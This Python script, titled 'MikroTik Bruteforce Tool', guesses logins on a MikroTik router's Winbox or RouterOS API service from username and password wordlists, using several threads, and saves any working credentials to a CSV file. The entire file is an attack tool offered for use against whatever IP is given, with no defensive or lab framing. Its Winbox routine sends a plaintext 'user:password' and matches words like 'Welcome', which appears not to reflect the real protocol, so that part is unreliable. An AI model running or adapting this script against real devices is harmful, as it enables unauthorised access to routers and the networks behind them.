#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import librouteros
from librouteros import connect
import time
import argparse
from threading import Thread, Lock, Semaphore
from queue import Queue
import os
import csv
from datetime import datetime

# Global variables
print_lock = Lock()
found_creds = False
success_count = 0
attempt_count = 0
start_time = time.time()
csv_file = None
csv_writer = None

def print_with_lock(message):
    with print_lock:
        print(message)

def init_csv(target_ip):
    global csv_file, csv_writer
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"mikrotik_creds_{target_ip}_{timestamp}.csv"
    
    csv_file = open(filename, 'w', newline='')
    csv_writer = csv.writer(csv_file)
    csv_writer.writerow(['IP Address', 'Username', 'Password', 'Port', 'Service', 'Status', 'Timestamp'])
    csv_file.flush()

def write_success(target_ip, username, password, port, service):
    global csv_writer
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    csv_writer.writerow([target_ip, username, password, port, service, 'OK', timestamp])
    csv_file.flush()

def try_winbox_login(ip, port, username, password, timeout=3):
    global found_creds, success_count, attempt_count
    if found_creds:
        return False
    
    attempt_count += 1
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        
        s.send(b'\x00')
        response = s.recv(1024)
        
        if b'Welcome' in response or b'winbox' in response.lower():
            auth_data = f"{username}:{password}".encode()
            s.send(auth_data)
            time.sleep(1)
            response = s.recv(1024)
            
            if b'logged in' in response.lower() or b'success' in response.lower():
                found_creds = True
                success_count += 1
                print_with_lock(f"\n[SUCCESS] Winbox credentials found: {username}:{password} on port {port}")
                write_success(ip, username, password, port, 'Winbox')
                return True
    except Exception:
        pass
    finally:
        try:
            s.close()
        except:
            pass
    return False

def try_api_login(ip, port, username, password):
    global found_creds, success_count, attempt_count
    if found_creds:
        return False
    
    attempt_count += 1
    try:
        api = connect(
            host=ip,
            username=username,
            password=password,
            port=port,
            timeout=5
        )
        
        identity = api(cmd='/system/identity/print')
        if identity:
            found_creds = True
            success_count += 1
            print_with_lock(f"\n[SUCCESS] API credentials found: {username}:{password} on port {port}")
            write_success(ip, username, password, port, 'API')
            api.close()
            return True
        api.close()
    except Exception as e:
        if "invalid user name or password" in str(e):
            pass
        else:
            print_with_lock(f"[API ERROR] {str(e)}")
    return False

def load_wordlist(file_path):
    if not os.path.isfile(file_path):
        print_with_lock(f"[ERROR] Wordlist file not found: {file_path}")
        return None
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print_with_lock(f"[ERROR] Could not read wordlist: {str(e)}")
        return None

def worker(method, ip, port, usernames, passwords, semaphore):
    global found_creds
    while not found_creds and not usernames.empty():
        username = usernames.get()
        
        while not found_creds and not passwords.empty():
            password = passwords.get()
            
            if method == "winbox":
                result = try_winbox_login(ip, port, username, password)
            elif method == "api":
                result = try_api_login(ip, port, username, password)
            
            if not result:
                print_with_lock(f"[TRYING] {username}:{password} on port {port}")
            passwords.task_done()
        
        usernames.task_done()
        if not found_creds:
            passwords = Queue()
            [passwords.put(p) for p in password_list]
    
    semaphore.release()

def print_stats():
    elapsed = time.time() - start_time
    rate = attempt_count / elapsed if elapsed > 0 else 0
    print_with_lock("\n[STATS] Attempts: {} | Successes: {}".format(attempt_count, success_count))
    print_with_lock("[STATS] Rate: {:.2f} attempts/sec".format(rate))
    print_with_lock("[STATS] Elapsed time: {:.2f} seconds".format(elapsed))

def main():
    global password_list, csv_file
    
    parser = argparse.ArgumentParser(description="MikroTik Bruteforce Tool")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-m", "--method", choices=["winbox", "api"], required=True, help="Bruteforce method")
    parser.add_argument("-p", "--port", type=int, help="Port to test")
    parser.add_argument("-P", "--ports", help="Multiple ports to test")
    parser.add_argument("-u", "--user", help="Single username to test")
    parser.add_argument("-U", "--userlist", help="Username wordlist file")
    parser.add_argument("-w", "--passlist", required=True, help="Password wordlist file")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("--timeout", type=float, default=3, help="Connection timeout")
    
    args = parser.parse_args()
    
    init_csv(args.target)
    password_list = load_wordlist(args.passlist)
    if not password_list:
        return
    
    if args.user:
        username_list = [args.user]
    elif args.userlist:
        username_list = load_wordlist(args.userlist)
        if not username_list:
            return
    else:
        print_with_lock("[ERROR] Specify username (-u) or username wordlist (-U)")
        return
    
    if args.ports:
        ports = [int(p.strip()) for p in args.ports.split(",")]
    elif args.port:
        ports = [args.port]
    else:
        ports = [8291] if args.method == "winbox" else [8728]
    
    usernames = Queue()
    [usernames.put(u) for u in username_list]
    
    passwords = Queue()
    [passwords.put(p) for p in password_list]
    
    semaphore = Semaphore(args.threads)
    
    print_with_lock("[START] Target: {} | Method: {} | Threads: {}".format(args.target, args.method, args.threads))
    print_with_lock("[INFO] Ports: {} | Usernames: {} | Passwords: {}".format(ports, len(username_list), len(password_list)))
    
    for port in ports:
        print_with_lock("[TESTING] Port {}".format(port))
        
        global found_creds
        found_creds = False
        
        while not usernames.empty() and not found_creds:
            semaphore.acquire()
            t = Thread(target=worker, args=(args.method, args.target, port, usernames, passwords, semaphore))
            t.start()
        
        for _ in range(args.threads):
            semaphore.acquire()
        
        if found_creds:
            break
    
    print_stats()
    
    if not found_creds:
        print_with_lock("\n[FAILED] No valid credentials found")
    
    if csv_file:
        csv_file.close()

if __name__ == "__main__":
    main()
